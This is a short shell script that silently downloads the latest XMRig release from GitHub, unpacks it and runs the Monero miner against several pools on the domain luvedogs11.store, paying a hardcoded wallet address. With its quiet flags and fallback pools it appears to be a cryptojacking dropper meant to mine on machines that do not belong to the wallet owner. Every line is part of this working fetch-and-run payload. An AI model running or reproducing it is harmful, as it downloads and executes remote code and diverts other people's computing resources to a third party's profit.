#!/bin/sh

curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
mkdir xm
tar xvf xm.tar.gz -C xm --strip-components=1
chmod +x ./xm/xmrig
./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o luvedogs11.store:3333 --nicehash -o luvedogs11.store:33333 --nicehash -o luvedogs11.store:22222 --nicehash -o luvedogs11.store:11111 --nicehash -o pool.supportxmr.com:3333 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p hash1 -k